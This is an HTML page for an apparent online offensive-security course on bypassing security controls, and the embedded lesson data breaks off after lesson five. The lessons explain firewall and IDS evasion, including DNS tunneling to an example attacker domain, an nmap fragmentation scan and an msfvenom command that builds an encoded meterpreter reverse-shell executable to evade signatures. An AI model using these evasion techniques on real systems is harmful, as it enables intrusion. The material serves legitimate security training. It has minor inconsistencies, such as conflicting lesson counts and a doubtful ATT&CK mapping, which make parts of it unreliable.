



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- ========== Start: SEO & Schema Enhancement ========== -->
    <title>Bypassing Security Controls Course | CipherHall</title>
    <meta name="description" content="A 25-lesson advanced course on bypassing security controls. Learn defense evasion, exploit development, and ethical hacking techniques in hands-on labs.">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/bypass-security-controls.html" />
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Adversary Simulation: Testing and Bypassing Security Controls",
      "description": "A comprehensive 25-lesson course for ethical hackers on the methodologies used to test, bypass, and validate the effectiveness of common cybersecurity controls.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Alex Chen"
        }
      }
    }
    </script>
    <!-- ========== End: SEO & Schema Enhancement ========== -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css"
    />
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================

      const COURSE_DATA = 
{
    "id": "bypass-security-controls",
    "title": "Adversary Simulation: Testing and Bypassing Security Controls",
    "description": "A comprehensive 30-lesson course for ethical hackers on the methodologies used to test, bypass, and validate the effectiveness of common cybersecurity controls.",
    "category": "cybersecurity-offensive",
    "difficulty": "Advanced",
    "duration": "50 hours",
    "instructor": "Dr. Alex Chen",
    "lessons": [
        {
            "id": "lesson-1",
            "title": "Introduction to Security Controls and the Evasion Mindset",
            "duration": "60 min",
            "objectives": [
                "Classify security controls as Preventive, Detective, and Corrective",
                "Understand the adversarial mindset for testing control effectiveness",
                "Grasp the importance of ethical boundaries and Rules of Engagement (RoE)",
                "Analyze the 'cat and mouse' dynamic between attackers and defenders"
            ],
            "content": {
                "overview": "This foundational lesson introduces the discipline of adversary simulation. We will define the key terminology, differentiate it from standard penetration testing, and establish the strategic mindset required to emulate a real-world attacker and test an organization's defenses in the most realistic way possible.",
                "sections": [
                    {
                        "title": "Defining Security Controls",
                        "content": "<p>Security controls are the safeguards and countermeasures that an organization implements to protect its assets. They can be categorized by their function:</p><ul><li><strong>Preventive Controls:</strong> Aim to *prevent* an incident from occurring. Examples include firewalls, access control lists, and application whitelisting.</li><li><strong>Detective Controls:</strong> Aim to *detect* an incident after it has occurred or as it is happening. Examples include Intrusion Detection Systems (IDS), antivirus alerts, and security monitoring logs.</li><li><strong>Corrective Controls:</strong> Aim to *remediate* the impact of an incident. Examples include an incident response plan, backups, and antivirus quarantine actions.</li></ul><p>Our primary focus will be on testing and bypassing preventive and detective controls.</p>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "The Evasion Mindset and Ethical Boundaries",
                        "content": "<p>To test a control, you must adopt the mindset of an adversary. This means thinking creatively and persistently about how a determined attacker might circumvent a given defense. However, this must always be done within a strict ethical framework.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Rules of Engagement (RoE)</strong></div><p>Every professional adversary simulation operates under a formal Rules of Engagement document. This is a contract that defines what is in scope, what is out of scope, what actions are permitted, and what actions are strictly forbidden (e.g., causing a denial of service, accessing sensitive PII). Operating without a clear RoE is not ethical hacking; it is illegal.</p></div>",
                        "image": "https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Ethical_Hacking_Pledge_and_RoE_Template.md",
                        "language": "markdown",
                        "code": "# Ethical Hacker's Pledge\n\n- I will operate only with explicit, written authorization.\n- I will protect the confidentiality of all client information.\n- I will not cause harm or disruption to the client's systems.\n- I will provide a detailed report of my findings and actionable recommendations for improvement.\n\n---\n\n## Rules of Engagement (Excerpt)\n\n**Objective:** Test the effectiveness of the endpoint security controls on the corporate workstations.\n\n**Forbidden Actions:**\n- Any action targeting production servers is forbidden.\n- Accessing or exfiltrating real employee or customer data is forbidden.\n- Any form of denial-of-service attack is forbidden."
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "A firewall is an example of which type of security control?",
                        "options": [
                            "Detective",
                            "Corrective",
                            "Preventive",
                            "Administrative"
                        ],
                        "correct": 2,
                        "explanation": "A firewall's primary purpose is to prevent unauthorized network connections, making it a preventive control."
                    },
                    {
                        "id": 2,
                        "question": "What is the most important document for defining the scope and boundaries of an ethical hacking engagement?",
                        "options": [
                            "The final report.",
                            "The invoice.",
                            "The Rules of Engagement (RoE).",
                            "A network diagram."
                        ],
                        "correct": 2,
                        "explanation": "The RoE is the foundational contract that ensures the engagement is conducted legally, safely, and with a clear understanding between the testers and the organization."
                    },
                    {
                        "id": 3,
                        "question": "The primary goal of adversary simulation is to...",
                        "options": [
                            "Break the law.",
                            "Cause damage to a company.",
                            "Identify weaknesses in security controls in a controlled manner to help an organization improve its defenses.",
                            "Prove that security is impossible."
                        ],
                        "correct": 2,
                        "explanation": "The ultimate goal is always defensive. By thinking like an attacker, ethical hackers provide invaluable insights that help organizations strengthen their security posture."
                    }
                ]
            }
        },
        {
            "id": "lesson-2",
            "title": "The Attacker's Methodology for Evasion",
            "duration": "75 min",
            "objectives": [
                "Understand the phased approach to bypassing controls",
                "Learn the difference between Evasion and Obfuscation",
                "Map bypass techniques to the MITRE ATT&CK® framework",
                "Use the ATT&CK Navigator to visualize a bypass scenario"
            ],
            "content": {
                "overview": "Bypassing a security control is a systematic process, not a single action. This lesson introduces the common methodologies that adversaries use to approach and circumvent defenses, and maps these actions to the industry-standard MITRE ATT&CK framework to provide a common language.",
                "sections": [
                    {
                        "title": "A Phased Approach",
                        "content": "<p>An attacker's approach to bypassing a control can be broken down into phases:</p><ol><li><strong>Reconnaissance:</strong> The attacker first needs to identify what control is in place. Is it a specific brand of firewall? Is there an EDR on the endpoint?</li><li><strong>Scanning / Probing:</strong> The attacker will carefully probe the control to understand its rules and behavior. What ports are open? What actions trigger an alert?</li><li><strong>Evasion / Bypass:</strong> The attacker will use the information gathered to craft a specific technique to circumvent the control.</li><li><strong>Obfuscation:</strong> The attacker will try to hide their actions to avoid leaving clear evidence in the logs, making forensic analysis harder.</li></ol>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Mapping to MITRE ATT&CK®",
                        "content": "<p>The MITRE ATT&CK framework is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It is the industry standard for describing attacker behavior.</p><h3>The 'Defense Evasion' Tactic:</h3><p>The Tactic that is most relevant to this course is <strong>TA0005: Defense Evasion</strong>. This Tactic contains a large number of specific Techniques that describe *how* adversaries bypass controls. Understanding these techniques is the key to both emulating them and defending against them.</p><h3>Example Techniques:</h3><ul><li><strong>T1070.004 - File Deletion:</strong> An attacker deletes their tools to evade forensics.</li><li><strong>T1562.001 - Disable or Modify Tools:</strong> An attacker attempts to disable the AV or EDR.</li><li><strong>T1027 - Obfuscated Files or Information:</strong> An attacker packs or encrypts their payload to bypass signatures.</li></ul>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Mapping_Evasion_Techniques_to_ATT&CK_IDs.py",
                        "language": "python",
                        "code": "evasion_map = {\n    \"Bypass Firewall\": [\"T1595\", \"T1090\"], # Active Scanning, Proxy\n    \"Bypass AV\": [\"T1027\", \"T1140\"], # Obfuscated Files, Deobfuscate/Decode Files\n    \"Bypass EDR\": [\"T1562.001\", \"T1055\"], # Disable Tools, Process Injection\n    \"Bypass NAC\": [\"T1049\"], # MAC Spoofing is a sub-technique of T1049\n}\n\ndef get_attack_ttp(technique_name):\n    return evasion_map.get(technique_name, \"TTP not found\")\n\nprint(f\"Techniques for Bypassing AV: {get_attack_ttp('Bypass AV')}\")"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Which Tactic in the MITRE ATT&CK framework is dedicated to the techniques used to bypass security controls?",
                        "options": [
                            "Initial Access",
                            "Execution",
                            "Defense Evasion (TA0005)",
                            "Exfiltration"
                        ],
                        "correct": 2,
                        "explanation": "The 'Defense Evasion' Tactic is a comprehensive collection of techniques adversaries use to avoid being detected by security products and analysts."
                    },
                    {
                        "id": 2,
                        "question": "What is the first step an attacker takes when trying to bypass a security control?",
                        "options": [
                            "Launch the exploit.",
                            "Reconnaissance: Identify what the control is and how it behaves.",
                            "Delete their logs.",
                            "Inform the blue team."
                        ],
                        "correct": 1,
                        "explanation": "An attacker cannot bypass a defense they don't understand. The first step is always to gather intelligence on the specific control that is in place."
                    },
                    {
                        "id": 3,
                        "question": "The act of an attacker encrypting their payload to avoid a signature match is an example of which MITRE ATT&CK technique?",
                        "options": [
                            "File Deletion (T1070.004)",
                            "Obfuscated Files or Information (T1027)",
                            "Masquerading (T1036)",
                            "Process Injection (T1055)"
                        ],
                        "correct": 1,
                        "explanation": "Encrypting or packing a payload is a classic obfuscation technique used to break signature-based detection, and is categorized under T1027 in the ATT&CK framework."
                    }
                ]
            }
        },
        {
            "id": "lesson-3",
            "title": "Lab Setup for Safe Experimentation",
            "duration": "90 min",
            "objectives": [
                "Understand the critical importance of an isolated lab environment",
                "Learn how to set up virtualization software (VMware, VirtualBox)",
                "Install and configure target machines (Windows, Metasploitable)",
                "Deploy security tools for monitoring (Security Onion, pfSense)",
                "Establish a safe and repeatable workflow for testing"
            ],
            "content": {
                "overview": "To practice bypassing security controls, we must first have controls to bypass. This lesson is a practical guide to building a safe, isolated virtual lab environment. A dedicated lab is absolutely essential for practicing these techniques legally and safely, without any risk to your own computer or any external network.",
                "sections": [
                    {
                        "title": "The Importance of Isolation",
                        "content": "<p>It is impossible to overstate the importance of this: <strong>never run malware or test exploits on a machine connected to the internet or your home network.</strong></p><p>We will use virtualization software to create a completely isolated 'network-in-a-box'. All of our virtual machines (attacker, victim, and security tools) will be configured to only communicate with each other, on a private, host-only virtual network. This ensures that any malicious code we detonate is safely contained within the lab environment.</p>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    },
                    {
                        "title": "Core Lab Components",
                        "content": "<p>A typical lab setup includes several virtual machines (VMs):</p><ul><li><strong>Attacker VM:</strong> A Linux distribution like Kali Linux, which comes pre-loaded with a huge range of security tools.</li><li><strong>Victim VM(s):</strong> These are our targets. We will use intentionally vulnerable VMs like Metasploitable2 (for Linux) and a standard (un-patched) Windows 10 VM.</li><li><strong>Firewall/Router:</strong> A VM running a firewall distribution like pfSense. This will act as the gateway for our virtual network, allowing us to create and test firewall rules.</li><li><strong>Monitoring VM:</strong> A VM running a full security monitoring suite like Security Onion. This will be our 'Blue Team' machine, allowing us to see what our attacks look like from a defender's perspective.</li></ul>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    },
                    {
                        "title": "Snapshots for Repeatability",
                        "content": "<p>One of the most powerful features of virtualization is <strong>snapshots</strong>. A snapshot is a saved state of a virtual machine at a specific point in time.</p><div class='info-box tip'><div class='info-box-header'><i class='fas fa-lightbulb'></i><strong>Resetting the Battlefield</strong></div><p>Before you run an exploit that might crash or alter a victim machine, you take a snapshot. After the test is done, you can instantly revert the VM to that clean snapshot state. This makes experimentation safe and repeatable, as you can always get back to a known-good starting point in seconds.</p></div>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Vagrantfile_for_Automated_Lab_Deployment.rb",
                    "language": "ruby",
                    "code": "# Vagrant is a tool for building and managing virtual machine environments.\n# This Vagrantfile defines a simple two-machine lab.\n\nVagrant.configure(\"2\") do |config|\n  # --- Attacker Machine: Kali Linux ---\n  config.vm.define \"kali\" do |kali|\n    kali.vm.box = \"kalilinux/rolling\"\n    kali.vm.network \"private_network\", ip: \"192.168.56.101\"\n    kali.vm.provider \"virtualbox\" do |vb|\n      vb.memory = \"2048\"\n    end\n  end\n\n  # --- Victim Machine: Metasploitable ---\n  config.vm.define \"metasploitable\" do |meta|\n    meta.vm.box = \"community/metasploitable2\"\n    meta.vm.network \"private_network\", ip: \"192.168.56.102\"\n  end\nend"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the most important rule when setting up a lab for exploit development?",
                        "options": [
                            "To use the fastest computer possible.",
                            "To ensure the lab is completely isolated from the internet and any production networks.",
                            "To install as many tools as possible.",
                            "To use only one virtual machine."
                        ],
                        "correct": 1,
                        "explanation": "Isolation is the number one safety rule. Running exploits or malware in a connected environment is dangerous and irresponsible."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary purpose of taking a 'snapshot' of a virtual machine?",
                        "options": [
                            "To back up your files.",
                            "To save the state of a VM at a specific point in time, allowing you to easily revert to it later.",
                            "To make the VM run faster.",
                            "To connect the VM to the internet."
                        ],
                        "correct": 1,
                        "explanation": "Snapshots are essential for repeatable experiments. They allow you to detonate malware or run an unstable exploit, and then instantly reset the victim machine to its clean, pre-exploit state."
                    },
                    {
                        "id": 3,
                        "question": "In a typical lab setup, a VM running Security Onion would serve what purpose?",
                        "options": [
                            "It is the attacker's machine.",
                            "It is the victim machine.",
                            "It is the 'Blue Team' or defensive monitoring platform, used to see what the attacks look like in logs and alerts.",
                            "It is the network's firewall."
                        ],
                        "correct": 2,
                        "explanation": "Including a monitoring VM is crucial for learning. It's not enough to know how to bypass a control; you need to understand the forensic trail your bypass leaves behind. Security Onion provides this defensive perspective."
                    }
                ]
            }
        },
        {
            "id": "lesson-4",
            "title": "Bypassing Firewalls & ACLs",
            "duration": "75 min",
            "objectives": [
                "Understand firewall rule logic (allow/deny, stateful inspection)",
                "Learn how to use source port manipulation to bypass simple ACLs",
                "Explore the use of fragmented packets to evade inspection",
                "Analyze how to tunnel traffic over allowed protocols like DNS"
            ],
            "content": {
                "overview": "The firewall is the most fundamental network security control. This lesson covers the common techniques that attackers use to evade firewall rules and access control lists (ACLs), from simple source port manipulation to advanced tunneling techniques.",
                "sections": [
                    {
                        "title": "Source Port Manipulation",
                        "content": "<p>A simple, stateless firewall might have a rule that allows all outbound traffic, but only allows inbound traffic for established connections. It might also have a rule that allows inbound traffic destined for a specific port, like TCP port 80 for a web server.</p><p>Some poorly configured firewalls might have rules based only on the *source* port. For example, a rule might implicitly trust any traffic that comes *from* TCP port 53 (DNS). An attacker can abuse this by crafting a packet that is sent *to* the target, but setting their own source port to 53. The weak firewall rule might allow this packet through.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    },
                    {
                        "title": "Fragmented Packets",
                        "content": "<p>A firewall or IDS needs to inspect the content of packets to look for malicious signatures. One way to try and evade this is with <strong>IP fragmentation</strong>.</p><p>An attacker can take a malicious packet and split it into many tiny fragments. Each individual fragment on its own is harmless and doesn't match any signature. The firewall might let them all through. The target host's operating system will then reassemble these fragments into the original, malicious packet. This technique can be used to bypass older or less sophisticated inspection engines that don't properly reassemble and inspect fragmented traffic.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Tunneling Over Allowed Protocols",
                        "content": "<p>The most powerful firewall bypass technique is to tunnel your traffic over a protocol that is almost always allowed outbound. The most common of these is <strong>DNS</strong>.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>DNS Tunneling</strong></div><p>An attacker can establish a full command and control channel over the DNS protocol. The implant on the compromised host will encode its data in a series of long, unique DNS queries (e.g., `data-chunk-1.attacker.com`). These queries are sent to the internal DNS server, which, by design, is allowed to forward them out to the internet. The attacker's authoritative DNS server receives the queries, extracts the data, and can send commands back in the DNS responses. Because every organization needs DNS to work, blocking it is not an option, making this a very reliable bypass technique.</p></div>",
                        "image": "https://images.unsplash.com/photo-1544383835-bda2bc66a22d?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "nmap -f <target_ip>",
                    "language": "bash",
                    "code": "# The '-f' flag in Nmap is used to fragment packets.\n\n# By default, Nmap will use a standard MTU size for its scan packets.\n# An IDS might have a signature that matches this default packet.\nnmap -sV -p 80 target-ip\n\n# Using '-f' will split the probe packet into smaller, 8-byte fragments.\n# This can sometimes cause an older IDS to fail to match the signature,\n# allowing the scan to go undetected.\nnmap -f -sV -p 80 target-ip\n\n# A more advanced tool like 'fragroute' can be used for more complex fragmentation attacks."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is a primary reason for an attacker to tunnel their C2 traffic over DNS?",
                        "options": [
                            "DNS is the fastest protocol.",
                            "DNS traffic is almost always allowed through a firewall, making it a reliable covert channel.",
                            "DNS encrypts all traffic by default.",
                            "It is easy to configure."
                        ],
                        "correct": 1,
                        "explanation": "The ubiquity of DNS is its strength for an attacker. Since blocking DNS would break the internet for the entire organization, it's a protocol that defenders must allow, and therefore one that attackers can abuse."
                    },
                    {
                        "id": 2,
                        "question": "What is the goal of using fragmented packets to attack a firewall or IDS?",
                        "options": [
                            "To make the packets arrive faster.",
                            "To split a malicious payload across many small packets, with the hope that the inspection engine will fail to reassemble and detect it.",
                            "To make the packets larger.",
                            "To encrypt the packets."
                        ],
                        "correct": 1,
                        "explanation": "This is an evasion technique designed to defeat pattern matching. Each individual fragment is benign, and the attack only succeeds if the security control fails to correctly buffer and reassemble all the fragments for inspection."
                    },
                    {
                        "id": 3,
                        "question": "An attacker sending a packet *from* a source port of 53 (DNS) to a random high port on a target is likely trying to exploit what?",
                        "options": [
                            "A vulnerability in the target's DNS service.",
                            "A poorly configured, stateless firewall rule that incorrectly trusts traffic based on its source port.",
                            "A web application vulnerability.",
                            "A misconfigured router."
                        ],
                        "correct": 1,
                        "explanation": "This is a classic trick to bypass simple ACLs. A rule that says 'allow traffic from port 53' is flawed, because the source port is controlled by the attacker. A stateful firewall would not fall for this."
                    }
                ]
            }
        },
        {
            "id": "lesson-5",
            "title": "Bypassing Network Intrusion Detection/Prevention Systems (IDS/IPS)",
            "duration": "75 min",
            "objectives": [
                "Differentiate between signature-based and anomaly-based detection",
                "Learn how to use payload encoding and polymorphism to evade signatures",
                "Explore the exploitation of IDS/IPS blind spots like encrypted traffic",
                "Use msfvenom to generate an encoded payload to bypass a signature"
            ],
            "content": {
                "overview": "An IDS/IPS is the next layer of network defense, actively looking for malicious patterns in the traffic that a firewall allows through. This lesson covers the common techniques used by attackers to evade these inspection engines, primarily by obfuscating their payloads to break signature matching.",
                "sections": [
                    {
                        "title": "Signature-Based Detection",
                        "content": "<p>A signature-based IDS/IPS works like antivirus for the network. It has a database of thousands of rules that match the patterns of known exploits and malware. For example, a Snort rule might look for the specific byte sequence associated with the MS08-067 exploit.</p><p>The key weakness is that it can only detect what it knows. Any variation that doesn't exactly match the signature will be missed.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Payload Encoding and Polymorphism",
                        "content": "<p>The primary way to bypass a signature-based IDS is to change the signature of your payload. This is done through <strong>encoding</strong>.</p><ul><li><strong>Encoders:</strong> An encoder (like the `shikata_ga_nai` encoder in Metasploit) uses a simple algorithm, like XOR, to scramble the original payload. The final executable will contain the scrambled payload and a small decoder 'stub'. When run, the stub will decode the original payload back into memory and execute it. The on-disk and on-the-wire representation is different, so the signature no longer matches.</li><li><strong>Polymorphism:</strong> A polymorphic engine automatically generates a unique, newly-encoded version of the payload each time. This means every victim receives a file with a completely unique signature, making signature-based detection nearly impossible.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Exploiting Blind Spots: Encrypted Traffic",
                        "content": "<p>The biggest blind spot for a traditional NIDS/NIPS is <strong>encrypted traffic</strong>. If an attacker's C2 communication is over HTTPS, the IDS cannot see the content of the packets. It can only analyze the metadata (IPs, ports, etc.).</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Encryption Dilemma</strong></div><p>While some organizations use 'SSL/TLS Interception' to decrypt and inspect traffic, this is complex, expensive, and has privacy implications. As a result, many organizations do not inspect encrypted traffic, making it a perfect channel for an attacker to hide their activity. This is why most modern C2 frameworks use SSL/TLS by default.</p></div>",
                        "image": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe",
                    "language": "bash",
                    "code": "# This command uses msfvenom to create an encoded payload.\n\n# -p windows/x64/meterpreter/reverse_tcp : The base payload to use.\n# -e x86/shikata_ga_nai : The encoder to use. This is a famous polymorphic encoder.\n# -i 5 : The number of iterations. Run the encoder 5 times to make it even more unique.\n# -f exe : The output format.\n# -o encoded.exe : The output file name.\n\n# The resulting 'encoded.exe' file will have a different hash and byte pattern\n# than a non-encoded version, which can help to bypass simple AV/IDS signatures."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary weakness of a signature-based IDS?",
                        "options": [
                            "It generates too many false positives.",
                            "It can only detect known attacks for which it has a signature.",
                            "It is very slow.",
                            "It cannot inspect network traffic."
                        ],
                        "correct": 1,
                        "explanation": "A signature-based system is like a bouncer with a list of known troublemakers. It's very good at stopping them, but it can't recognize a new troublemaker who isn't on the list."
                    },
                    {
                        "id": 2,
                        "question": "What is the purpose of using an encoder like 'shikata_ga_nai' on a payload?",
                        "options": [
                            "To make the payload smaller.",
                            "To change the signature of the payload to evade detection by signature-based security tools.",
                            "To make the payload execute faster.",
                            "To add new functionality to the payload."
                        ],
                        "correct": 1,
                        "explanation": "Encoding is a form of obfuscation. It transforms the payload into a different byte pattern, which breaks the signature match that the IDS or AV is looking for."
                    },
                    {
                        "id": 3,
                        "question": "Why is encrypted traffic a major blind spot for many network security monitoring tools?",
                        "options": [
                            "Because it is not very common.",
                            "Because the tools cannot see the content of the encrypted packets, making it impossible to perform signature matching on the payload.",
                            "Because encryption makes the traffic slower.",
                            "Because attackers do not use encryption."
                        ],
                        "correct": 1,
                        "explanation": "Unless the organization is using TLS interception (which is complex), encrypted traffic passes through the network as an opaque blob. This makes it an ideal channel for attackers to hide their C2 communications."
                    }
                ]
            }
        },
        {
